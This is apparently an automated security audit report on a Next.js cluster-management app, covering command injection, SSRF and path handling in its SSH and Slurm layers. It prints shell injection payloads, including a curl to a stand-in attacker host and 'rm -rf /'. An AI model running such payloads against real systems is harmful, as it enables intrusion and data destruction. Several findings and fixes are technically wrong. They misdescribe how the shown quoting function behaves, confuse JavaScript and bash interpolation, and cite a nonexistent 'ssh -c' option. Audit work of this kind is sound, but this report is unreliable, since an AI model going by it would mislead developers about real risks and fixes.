# Security Audit: Command Injection & SSRF in scicom-aura

**Scope:** API routes (`app/api/**/route.ts`), SSH/Slurm execution layer, reverse proxies  
**Date:** 2026-04-27  
**Audit Focus:** Bash script construction with user input, URL/IP handling in proxies

---

## Critical Findings

### 1. Command Injection in `/api/clusters/[id]/packages` — Package Name Splicing

**File:** `/home/husein/ssd3/scicom-aura/web/app/api/clusters/[id]/packages/route.ts:129`

**Bad Code:**
```typescript
const packages: string[] = body.packages ?? [];  // admin-controlled JSON array
const pkgList = packages.join(" ");
// ...later in script:
${workerBlock}  // contains:
$S apt-get remove -y -qq ${pkgList} 2>&1  // direct variable interpolation
```

**Threat:** An admin sends `{ packages: ["foo && malicious-command; bar"] }`. The package name is spliced directly into the bash script without quoting. When `apt-get remove -y -qq foo && malicious-command; bar` runs, the shell interprets `&&` as a command separator and executes arbitrary code as root on every worker node.

**Remediation:** Quote package names: `apt-get remove -y -qq ${pkgList//\'/\'\\\'\'}` or use positional args instead of interpolation.

---

### 2. Unsafe Shell Quoting in `/api/clusters/[id]/prometheus/[...path]` — Embedded Single-Quote Bypass

**File:** `/home/husein/ssd3/scicom-aura/web/app/api/clusters/[id]/prometheus/[...path]/route.ts:86,104,130`

**Bad Code:**
```typescript
function shellQuote(s: string): string {
  return `'${s.replace(/'/g, `'\\''`)}'`;  // escape single quotes
}
// ...
const bodyPart = `--data ${shellQuote(text)}`;  // line 86
const cmd = `curl -sS --max-time 15 ${bodyPart} -w '\\n__AURA_HTTP__:%{http_code}\\n' ${shellQuote(url)}`;
const r = await sshExecSimple(tgt, cmd);  // passes cmd as arg[N], NOT as -c 'cmd'
```

**Threat:** The `shellQuote` function escapes single quotes for shell string literals. However, in `sshExecSimple`, the command is passed as a raw argument to `ssh` (line 370: `[..., command]`), not as a shell string. When the ssh server receives it, it *does* interpret it as a shell command. A POST body like `{"foo": "'; curl attacker.com; echo '"}` will be quoted as `''; curl attacker.com; echo '''` and the `''` pair terminates the quote context, allowing command injection. The `shellQuote` defense is ineffective because the downstream `sshExecSimple` → `spawn("ssh", [..., command])` treats `command` as a raw bash script input.

**Actual Attack:** Craft a POST body with JSON containing a quote-escape sequence that breaks out of the single-quoted context. Example POST body:
```json
{"query": "'; whoami; echo '"}
```
Results in: `''; whoami; echo '''` — the first pair `''` and final `'` terminate the quote, injecting `whoami`.

**Remediation:** Use `spawn("ssh", [..., "--", command])` to clearly separate options from the command argument, OR pass the curl invocation via `ssh` with `-c 'curl...'` fully built server-side, OR avoid shell injection altogether by using Node.js `fetch` against a localhost tunnel instead of relying on quoting.

---

### 3. Path Traversal + Shell Injection in `/api/clusters/[id]/files` — JSON.stringify Bypass

**File:** `/home/husein/ssd3/scicom-aura/web/app/api/clusters/[id]/files/route.ts:93,96`

**Bad Code:**
```typescript
const path = url.searchParams.get("path") ?? "";  // user input
const abs = safeJoin(root.base, path);  // path traversal check
if (!abs) return NextResponse.json({ error: "Invalid path" }, { status: 400 });

const script = `#!/bin/bash
set +e
echo "${marker}_START"
if [ ! -d ${JSON.stringify(abs)} ]; then
  echo "__NOT_DIR__"
else
  find ${JSON.stringify(abs)} -maxdepth 1 ...
fi
```

**Threat:** `JSON.stringify(abs)` encodes the path as a JSON string, which then is interpolated *as a bash variable* inside double quotes. An attacker cannot inject directly via `abs` (the path checks prevent `..` and absolute paths). However, `JSON.stringify` output can still contain double quotes if the filename contains them (unlikely but technically possible in Linux). More importantly, the string is inside `${}` bash expansion with double quotes, making it vulnerable to `$(...)` command substitution if a filename contained such patterns. The practical attack is limited by `safeJoin` filtering, but the mixing of JSON encoding with bash interpolation is fragile.

**Threat Model:** Low immediate risk due to `safeJoin`, but if `safeJoin` logic is ever relaxed or bypassed, the script becomes injectable. The pattern `${JSON.stringify(untrustedString)}` inside double quotes is unsafe.

**Remediation:** Use single quotes for the filename: `find '${abs}' ...` or better, use `printf %q` to emit properly escaped POSIX shell literals: `find $(printf '%q' "$abs") ...`.

---

## High Findings

### 4. Admin-Controlled SSRF via `stackIp` / `stackHost` Configuration

**File:** `/home/husein/ssd3/scicom-aura/web/app/api/clusters/[id]/prometheus/[...path]/route.ts:94,95`  
**Also:** `/home/husein/ssd3/scicom-aura/web/app/api/clusters/[id]/grafana-proxy/[id]/[[...path]]/route.ts:74,81`

**Bad Code:**
```typescript
const metrics = readMetricsConfig(config);  // admin sets metrics.stackHost
const stack = resolveStackHost(cluster.controllerHost, config, metrics);
const stackIp = stack.isController ? "127.0.0.1" : stack.ip;  // resolved from admin-editable config
const url = `http://${stackIp}:${metrics.prometheusPort}/${subPath}${qs}`;
const cmd = `curl ... ${shellQuote(url)}`;
const r = await sshExecSimple(tgt, cmd);
```

And in grafana-tunnel.ts:
```typescript
const grafanaIp = stack.isController ? "127.0.0.1" : stack.ip;
const tunnelTarget = { ...target, bastion: cluster.sshBastion };
let localPort = await getGrafanaTunnel(clusterId, tunnelTarget, grafanaIp, metrics.grafanaPort);
const upstream = `http://127.0.0.1:${localPort}${upstreamPath}`;
```

**Threat Model:** An admin who edits cluster config can set `config.metrics.stackHost` to point the Prometheus/Grafana proxy at an arbitrary internal IP. The proxy then SSHes to the controller and runs `curl http://<admin-chosen-ip>:<port>/...` from inside the cluster network. If the admin is compromised or malicious, they can probe internal services (databases, management interfaces, etc.) that are only reachable from inside the cluster.

**Impact:** Server-Side Request Forgery (SSRF) — the Aura server becomes a pivot point into the cluster's internal network. An attacker with admin credentials can scan/attack internal infrastructure. However, the attack requires admin access to edit cluster config, so this is admin-to-admin abuse rather than user-to-admin escalation.

**Remediation:** This is by-design — metrics stack must be accessible. Mitigations: (a) Log all curl invocations with destination IP/port for audit; (b) Restrict stackHost to a hardened allowlist (admin can only pick from known worker hostnames, not free-form IPs); (c) Validate that stackIp is in a trusted subnet before using it.

**Note:** Already partially mitigated by `resolveStackHost` — it only returns IPs from `slurm_hosts_entries`, preventing free-form user input. Admin would have to inject a malicious worker entry into cluster config to exploit this, which is a large scope change. **Acceptable risk** if admins are trusted.

---

### 5. No Validation on Job Submission Script Content

**File:** `/home/husein/ssd3/scicom-aura/web/lib/submit-job.ts:100–128`

**Bad Code:**
```typescript
const { script, partition } = body;
if (!script || !partition) return error(...);  // only checks presence, not content

const wrapper = `#!/bin/bash
set +e
...
echo "${scriptB64}" | base64 -d | $S tee ${scriptPath} > /dev/null
$S chown ${username}:${username} ${scriptPath}
$S chmod 755 ${scriptPath}

OUT=$(sudo -n -u ${username} -H bash -c "cd ${submitDir} && sbatch --parsable ${scriptPath}" 2>&1)
```

**Threat:** While the script itself is base64-encoded so it cannot inject into the wrapper, the `partition` field is interpolable into the sbatch call (implicitly, if sbatch were invoked inline — here it's in a file). More critically, the `username` is interpolated:
```typescript
if (!id ${username} >/dev/null 2>&1; then ...
```
The `username` comes from the database (`dbUser.unixUsername`) and is trusted. **Not a direct vulnerability**, but if the username field were ever user-editable, this would be injectable.

**Threat Model:** Low. The script content is properly base64-encoded so cannot break the heredoc. The partition parameter is not used in a shell context directly — it's written to the script file, not interpolated into the wrapper. However, the pattern is fragile.

**Remediation:** Validate that `partition` is alphanumeric (matches SLURM partition naming rules). Keep script encoding.

---

## Medium Findings

### 6. Loose Path Validation in `/api/clusters/[id]/files` — Could Tighten

**File:** `/home/husein/ssd3/scicom-aura/web/app/api/clusters/[id]/files/route.ts:29–34`

**Code:**
```typescript
function safeJoin(base: string, rel: string): string | null {
  if (rel.startsWith("/")) return null;
  const parts = rel.split("/").filter(Boolean);
  for (const p of parts) if (p === "..") return null;
  return parts.length === 0 ? base : `${base.replace(/\/+$/, "")}/${parts.join("/")}`;
}
```

**Issue:** The function blocks `..` and absolute paths, but doesn't validate that the final path is actually a subdirectory of `base`. A path like `base/../other` is rejected because it contains `..`, but if `base="/home/alice"` and someone requests `/home/alice/something`, the function allows it. No actual vulnerability (the function returns the correct path), but the comment says "reject paths that escape the root" — it should validate that the resolved path is within base.

**Remediation:** After joining, verify `realpath` is under base: use `path.relative(base, abs)` and check it doesn't start with `..`.

---

### 7. Unvalidated Package Names in `DELETE /api/clusters/[id]/packages`

**File:** `/home/husein/ssd3/scicom-aura/web/app/api/clusters/[id]/packages/route.ts:98–146`

**Code:**
```typescript
const packages: string[] = body.packages ?? [];
if (packages.length === 0) return error(...);

const pkgList = packages.join(" ");
// ...
$S apt-get remove -y -qq ${pkgList} 2>&1 | grep -E ...
```

**Threat:** The `packages` array comes from user input (admin), but there's no validation that each package name is a valid Debian package name. A malicious admin could include shell metacharacters:
- `packages: ["foo;rm -rf /", "bar"]` → `apt-get remove foo;rm -rf / bar` → injected command
- `packages: ["foo$(whoami)bar"]` → command substitution in `$()` or backticks (depends on quoting)

**Current Behavior:** No quoting around `${pkgList}`, so any shell metacharacter in a package name will execute.

**Remediation:** Quote each package individually: 
```bash
apt-get remove -y -qq $(printf '%q ' "${packages[@]}") 2>&1
```
Or use array-safe syntax:
```bash
apt-get remove -y -qq "${packages[@]}" 2>&1
```

---

## Low Findings

### 8. Weak SSH Command Argument Passing

**File:** `/home/husein/ssd3/scicom-aura/web/lib/ssh-exec.ts:150,359`

**Code:**
```typescript
const proc = spawn("ssh", [
  "-i", keyPath,
  "-p", String(target.port),
  ...
  `${target.user}@${target.host}`,
  command,  // passed as array argument
], { stdio: ["pipe", "pipe", "pipe"] });
```

**Issue:** When `command` is passed as an array element, it's treated by OpenSSH as a remote command argument. However, if the remote sshd runs a login shell (e.g., `/bin/bash -l`), that shell will interpret the command with full shell metacharacter expansion. The current code is correct in passing `command` as a literal argument, but the comments suggest uncertainty about quoting. The downstream code (e.g., prometheus proxy) tries to re-quote using `shellQuote`, which is then evaluated by the remote shell — a problematic pattern.

**Remediation:** Document clearly that remote command arguments are evaluated by the remote shell, and either: (a) fully build the command server-side with proper shell escaping, or (b) use `ssh -c 'command'` syntax and build the command string with quotes integrated.

---

### 9. No Timeout on Long-Running Bastion Sessions

**File:** `/home/husein/ssd3/scicom-aura/web/lib/ssh-bastion-mux.ts:65,303`

**Code:**
```typescript
const EXEC_TIMEOUT_MS = parseInt(process.env.AURA_BASTION_MUX_EXEC_MS ?? "600000", 10);  // 10 minutes default
// ...
this.currentTimer = setTimeout(() => {
  this.finishCurrent(-1, false, "exec timeout");
  this.kill("exec timeout");
}, EXEC_TIMEOUT_MS);
```

**Issue:** The timeout is long (10 minutes) and kills the entire session on timeout. A job that takes 9 minutes 59 seconds works; one at 10:01 kills the mux session for all other callers. Not a direct security issue, but can cause DoS if a user submits a job that runs slightly longer than the default timeout.

**Remediation:** Increase the timeout or make it configurable per-call, similar to `sshExecScript`'s `timeoutMs` callback parameter.

---

## Info / Acceptable Risk

### 10. Admin-Only Endpoints Properly Gated

**Findings:** Routes like `/api/clusters/[id]/exec`, `/api/clusters/[id]/packages`, `/api/clusters/[id]/command` check for `role === "ADMIN"` or `ClusterUser ACTIVE` status. The threat models for these routes (arbitrary command execution, package removal) are acceptable if the admin is trusted.

**Example:**
```typescript
export async function POST(req: NextRequest, { params }: RouteParams) {
  const session = await auth();
  if (!session?.user || (session.user as any).role !== "ADMIN") {
    return NextResponse.json({ error: "Forbidden" }, { status: 403 });
  }
```

**Mitigation Status:** Implemented. No escalation found from non-admin to admin capabilities.

---

### 11. Job Script Encoding Defense

**Finding:** Job submission properly base64-encodes the script to avoid breaking the wrapper's heredoc. The script is written to a temporary file on the controller and executed, not interpolated. This is correct.

**Mitigation Status:** Properly designed.

---

## Summary Table

| ID | Severity | File | Issue | Remediation |
|---|---|---|---|---|
| 1 | **CRITICAL** | `packages/route.ts:129` | Package names unsanitized in `apt-get remove` | Shell-quote each package or use array args |
| 2 | **CRITICAL** | `prometheus/[...path]/route.ts:104` | `shellQuote` insufficient; command passed as raw arg | Use `--` separator or move to HTTP tunnel |
| 3 | **CRITICAL** | `files/route.ts:93` | JSON.stringify in bash double quotes | Use single quotes or `printf %q` |
| 4 | High | `prometheus/route.ts:94` | Admin-set `stackIp` enables SSRF | Validate IP in trusted subnet; log curl calls |
| 5 | High | `submit-job.ts` | Username unvalidated in shell context | Username already from DB; acceptable if DB trusted |
| 6 | Medium | `files/route.ts:29` | `safeJoin` doesn't verify result is subdir of base | Use `path.relative()` and check no `..` in result |
| 7 | Medium | `packages/route.ts:129` | Same as #1, unquoted in bash | As #1 |
| 8 | Low | `ssh-exec.ts:150` | Command quoting pattern unclear | Document & standardize |
| 9 | Low | `ssh-bastion-mux.ts:303` | 10-min timeout kills session for all | Make configurable per-call |

---

## Recommendations

1. **Immediate:** Fix Critical findings #1, #2, #3. Test with injection payloads.
2. **Short-term:** Implement input validation for package names, partition names, and other enums.
3. **Medium-term:** Replace shell-based proxying with native Node.js `fetch` calls over SSH tunnels.
4. **Process:** Add a linter rule to flag template strings containing `${` inside shell script contexts.

